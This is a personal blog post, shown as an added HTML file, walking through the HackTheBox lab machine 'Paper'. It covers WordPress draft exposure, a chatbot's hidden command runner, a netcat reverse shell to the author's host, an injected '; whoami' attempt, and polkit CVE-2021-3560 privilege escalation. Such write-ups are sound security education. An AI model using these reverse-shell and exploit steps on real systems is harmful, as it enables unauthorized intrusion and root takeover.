@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Paper - Sean Benson: Pentesting Lab Write Ups</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="A writeup for the HackTheBox machine, Paper." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Paper" />
+<meta property="og:description" content="A writeup for the HackTheBox machine, Paper." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sbenson09.github.io/posts/paper/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-03-15T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Paper"/>
+<meta name="twitter:description" content="A writeup for the HackTheBox machine, Paper."/>
+<script src="https://sbenson09.github.io/js/feather.min.js"></script>
+	
+	
+        <link href="https://sbenson09.github.io/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://sbenson09.github.io/css/main.227651ecdb9cf1298422fa6513f2dd73b507923eb692191d1068d1d571430e76.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://sbenson09.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css" media="(prefers-color-scheme: dark)"  />
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://sbenson09.github.io/">Sean Benson: Pentesting Lab Write Ups</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			
+			<h1 class="title">Paper</h1>
+			
+			
+			<div class="meta">Posted on Mar 15, 2022</div>
+		</div>
+		
+
+		<section class="body">
+			<p>For this writeup, I will cover my experience on the HackTheBox machine <a href="https://app.hackthebox.com/machines/432">Paper</a>, a Linux system with a rating of <strong>Easy</strong>.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>To begin, I run a quick <code>nmap</code> scan against the host to identify any services of interest.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ nmap 10.10.11.143             
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 23:16 EDT
+Nmap scan report for office.paper (10.10.11.143)
+Host is up (0.081s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
+</code></pre></div><p>Immediately, we discover web servers are running on TCP 80 &amp; 443. At this point, I choose to ignore the ssh server on port 22, since I don&rsquo;t have credentials and it likely won&rsquo;t be an avenue worth exploring.</p>
+<p>When browsing over both HTTP and HTTPS, we are greeted by what I assume is a default page after installing and running apache. Knowing that this will not be useful for our purposes, I decide to enumerate further, and kick off a couple of <code>gobuster</code> scans, for enumerating potential subdomains, and directories and files. In this case, I ran both against the HTTP port.</p>
+<p>Subdomains:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ gobuster dns -d 10.10.11.143 -w /usr/share/wordlists/dirb/big.txt
+</code></pre></div><p>Directories and files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ gobuster dir -u http://10.10.11.143 -w /usr/share/wordlists/dirb/big.txt 
+</code></pre></div><p>The subdomain scan did not return with anything, however, the the directory scan did return some items of interest.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/.htaccess            (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/cgi-bin/             (Status: 403) [Size: 199]
+/manual               (Status: 301) [Size: 235] [--&gt; http://10.10.11.143/manual/]
+</code></pre></div><p>Specifically, the <code>/cgi-bin/</code> path caught my eye. To further enumerate, I ran another <code>gobuster</code> scan, but this time, targeted at the <code>/cgi-bin/</code> directory. While that ran, I inspected the <code>/manual</code> page. This appeared to also be stock documentation, and after some brief investigation, I determined it would not be of use.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ gobuster dir -u http://10.10.11.143/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt
+</code></pre></div><p>However, this scan would return nothing, and at this point, I was left without any leads, so I opted to run a couple more <code>nmap</code> scans.</p>
+<p>The first scan used the <code>-sV</code> flag, which I used to identify the version of <code>httpd</code> that was running. This returned with version <strong>2.4.37</strong>, which I quickly searched online for to see if there were any notable vulnerabilities with exploits. None of the vulnerabilities I found were of interest, and I moved on.</p>
+<p>The second scan was this time targeted to the entirety of the TCP port range. To be honest, this took a while, and by the time it completed, I had already moved on.</p>
+<p>While this ran, I revisited the webpage being served to see if there were any interesting HTTP headers being included in the server response. To do this, I opened Firefox&rsquo;s develop tools, went to the Network menu, and then browsed the page. Over port 80, I did find an unexpected response header value, specifically, <code>X-Backend-Server: office.paper</code>. With this, I assumed that this might require us to have a corresponding <code>Host: office.paper</code> request header.</p>
+<p>The easiest way to do this would be to add an <code>office.paper</code> entry to our <code>/etc/hosts/</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.11.143 office.paper
+</code></pre></div><p>Once it has been added, I attempt to browse to the same page. Behold!  We are met with a completely new website, built in WordPress. At this point, I am very confident we have found our target.</p>
+<h2 id="getting-the-user-flag">Getting the user flag</h2>
+<p>I begin exploring the website to see if we can find anything that points us in the right direction, and was able to find three posts. None of the posts had anything of interest, however, there was a comment that suggested that it was possible to read the user&rsquo;s drafts, which is obviously not how drafts typically work, and I suspected this may be hinting at a potential vulnerability to exploit.</p>
+<p>Thus, I quickly searched Google for WordPress vulnerabilities impacting v5.2.3, which I knew was the version via the <a href="https://www.wappalyzer.com/apps">Wappalyzer</a> Firefox extension.</p>
+<p>The first link I clicked on was to <a href="https://wpscan.com/wordpress/523">WPScan</a>, and fortunately for us, WPScan does a really great job of documenting vulnerabilities to WordPress. I immediately scrolled from the top to the bottom of the list just to understand the length of the list, and coincedentally, at the very bottom of the list was the vulnerability <a href="https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2">WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts</a>.</p>
+<p>From there, I found the included URL to a PoC exploit for the vulnerability, and skimmed through the PoC. Recreating the PoC is incredibly simple, and ultimately all we had to do was request the  URL of <code>http://office.paper/?static=1</code>. After doing that, we had access to the user&rsquo;s drafts.</p>
+<p>Most of the drafts were not relevant, however, there was a breadcrumb:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+</code></pre></div><p>After attempting to browse that site, we are met with a <em>Server Not Found</em> error. I assumed this was another case of needing to provide the Host value in the request header, so added another entry to our <code>/etc/hosts/</code> file, this time resolving <code>chat.office.paper</code> to the machine&rsquo;s IP address.</p>
+<p>This was successful! We were then able to browse to the provided registration URL and register an account to the <a href="https://rocket.chat/">rocket.chat</a> service.</p>
+<p>Upon logging in, you are presented with a pretty standard chat tool interface. I have never used rocket.chat before, but it is very similar to Slack. After playing around in the interface, I was able to find a public channel labeled #general, so I joined it and read some of the pre-existing conversation between the &ldquo;company&rdquo; employees.</p>
+<p>In this conversation, they mention a bot programmed by one of the employees (Dwight) that is able to parse commands from the chat. There are five documented commands the bot supports; two of which are goofy functions that I ignored; one of which provides the time; and the remaining two allow a user to list and download files. I would start a DM directly with the bot, named &lsquo;recyclops&rsquo;, to start testing these functions.</p>
+<p>The list command allows you to specify a path, and from there, returns output similar to what you&rsquo;d expect from running <code>ls -l</code>. I started exploring this command to understand both what is on the filesystem, and how we may be able to abuse the command.</p>
+<p>I was able to view the contents of the <code>dwight</code> user&rsquo;s home directory. In this directory, we can see one of our targets, the <code>user.txt</code> flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sbenson 12:30 AM
+list ..
+
+recyclops Bot 12:30 AM
+Fetching the directory listing of ..
+total 32
+drwx------ 11 dwight dwight 281 Feb 6 07:46 .
+drwxr-xr-x. 3 root root 20 Mar 15 20:28 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
+-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
+-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
+-rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot
+-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh
+-r-------- 1 dwight dwight 33 Mar 15 20:02 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim
+</code></pre></div><p>However, I was not able to escape out of the bot to run my own commands.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sbenson 12:32 AM
+list ../user.txt ; whoami
+
+recyclops Bot 12:32 AM
+Stop injecting OS commands! 
+</code></pre></div><p>Given that the list command was able to access files outside of the <code>sales</code> directory, I thought I would attempt to get the user flag using the file command.</p>
+<p>However, any attempts to access files outside of the <code>sales</code> directory did not work, and are returned with <strong>Access denied.</strong> messages. Similarly, any attempt to escape out of the command is met with the same <strong>Stop injecting OS commands!</strong> message.</p>
+<p>After some additional exploring using the combination of these two commands, I noticed the <code>hubot</code> directory in the user&rsquo;s home directory. With further exploration, we discover a <code>hubot/scripts</code> directory. At first glance, the directory seems to store all of the various custom scripts the recyclops bot is configured use.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sbenson 12:40 AM
+list ../hubot/scripts
+
+recyclops Bot 12:40 AM
+Fetching the directory listing of ../hubot/scripts
+total 48
+drwx--x--x 2 dwight dwight 193 Jan 13 10:56 .
+drwx------ 8 dwight dwight 4096 Sep 16 07:57 ..
+-rwxr-xr-x 1 dwight dwight 490 Jul 3 2021 cmd.coffee
+-rwxr-xr-x 1 dwight dwight 729 Jul 3 2021 dwight.js
+-rwxr-xr-x 1 dwight dwight 303 Jul 3 2021 error.coffee
+-rwxr-xr-x 1 dwight dwight 544 Jul 3 2021 example.js
+-rwxr-xr-x 1 dwight dwight 1384 Jan 13 10:56 files.js
+-rwxr-xr-x 1 dwight dwight 2410 Jul 3 2021 help.js
+-rwxr-xr-x 1 dwight dwight 1428 Jul 3 2021 listof.js
+-rwxr-xr-x 1 dwight dwight 555 Jul 3 2021 run.js
+-rwxr-xr-x 1 dwight dwight 964 Jul 3 2021 smalltalk.js
+-rwxr-xr-x 1 dwight dwight 900 Jul 3 2021 version.js
+-rwxr-xr-x 1 dwight dwight 547 Jul 3 2021 why.js
+</code></pre></div><p>Most of these are expected and map to the features described by the bot&rsquo;s help message. However, the <code>run.js</code> file, or any other generic run feature, was not described by the bot&rsquo;s help message. With this knowledge, I attempted to test for a run command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sbenson 12:51 AM
+run pwd
+
+recyclops Bot 12:51 AM
+Running pwd
+/home/dwight/hubot
+</code></pre></div><p><strong>Success!</strong> From here, we are able to get the user flag by cat-ing the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sbenson 12:53 AM
+run cat ../user.txt
+
+recyclops Bot 12:53 AM
+Running cat ../user.txt
+2ba57118a5b405aa4783d85c16190b99
+</code></pre></div><h2 id="getting-the-root-flag">Getting the root flag</h2>
+<p>With the ability to run commands via the chatbot, my first goal was to see if we could get a full shell environment via netcat. Fortunately, a <code>nc</code> binary already existed on the lab system in <code>/usr/bin/</code>.</p>
+<p>On my system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nc -nvlp 4444
+</code></pre></div><p>On the lab system, via chatbot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">run nc 10.10.14.13 4444 -e /bin/bash
+</code></pre></div><p>The reverse shell successfully connected, and I confirm by sending over a test <code>id</code> command, which returns the expected result. From here I decide to upgrade the simple reverse shell to an interactive tty using the Python pty method (see additional details <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">here</a>.</p>
+<p>First, I check for the existence of python on the system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ which python python2 python3
+/usr/bin/python3
+</code></pre></div><p>Because we were able to find <code>python3</code>, I issue the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre></div><p>With this fully interactive shell, my next focus is on finding avenues for privilege escalation. To do this, I download and run <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a> onto the system. At first, I attempted to <code>curl</code> the <code>linpeas.sh</code> script directly from github on the lab system, however, it was not able to resolve github.com. To get around this, I quickly setup a simple webserver on my system using python to serve the linPEAS script, and then used <code>curl</code> to download the file onto the lab system. Once downloaded, I made the script executable using <code>chmod</code>, and then ran the script to output to a file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./linpeas.sh -a &gt; linpeas.txt
+</code></pre></div><p>Once completed, I thoroughly go through the output of the linPEAS script. The linPEAS script includes  <strong>a lot</strong> of information, much of which may not be useful for us. To begin with, I focus on the &ldquo;RED/YELLOW&rdquo; items, which are considered &ldquo;95% a PE vector&rdquo; according to the legend at the top.</p>
+<p>The first item RED/YELLOW item from the top is the vulnerability to CVE-2021-3560. To begin, I search Google for a CVE-2021-3560 exploit. Conveniently, the <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">first link returned by Google</a> is a PoC exploit. More interestingly, it appears to be authored by the same person who put together this lab machine. Given this, I am 99.9% confident that this is the exploit we will want to use to escalate privileges.</p>
+<p>I download and slightly modify the <code>poc.sh</code> file from this PoC, just to use a non-default username and password to ensure I don&rsquo;t step on any other users of the lab systems' toes. I then download the file to the lab system similar to how I did for linPEAS, and run then run the <code>poc.sh</code> script.</p>
+<p>The script provides a bunch of useful output that describes what it&rsquo;s doing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[!] Username set as : sbenson
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as &#34;centos&#34;
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username sbenson...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username sbenson  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - sbenson
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter &#39;sudo bash&#39; and drop into a root shell!
+</code></pre></div><p>As described in the output, because it is a timing-based attack, this may require multiple attempts. In my case, after 4 rounds of running the script and attempting to switch to my injected user, I was able to successfully switch. After that, I was able to escalate privileges to root using <code>sudo bash</code>.</p>
+<p><strong>Finally</strong>, I was able to get ahold of the root flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[root@paper sbenson]# cat /root/root.txt
+713f4b9fcbb40438a8ffb89c70ae59de
+</code></pre></div><h2 id="review">Review</h2>
+<p>Overall, I thought this was a fun lab machine that was rightly rated as Easy. Most of what is needed to exploit the system is in relatively-plain view, and the box never goes out of its way to confuse you.</p>
+<p>For me, finding the initial foothold was the most challenging part, but once I found the foothold, everything else went relatively smoothly.</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/linux">linux</a></li>
+					
+					<li><a href="/tags/webserver">webserver</a></li>
+					
+					<li><a href="/tags/easy">easy</a></li>
+					
+					<li><a href="/tags/hackthebox">hackthebox</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/sbenson09/sbenson09" title="GitHub"><i data-feather="github"></i></a><a class="soc" href="https://www.linkedin.com/in/seanmbenson/" title="LinkedIn"><i data-feather="linkedin"></i></a><a class="soc" href="mailto:sbenson@hey.com" title="Email"><i data-feather="mail"></i></a></div>
+  <div class="footer-info">
+    2022  © Sean Benson |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
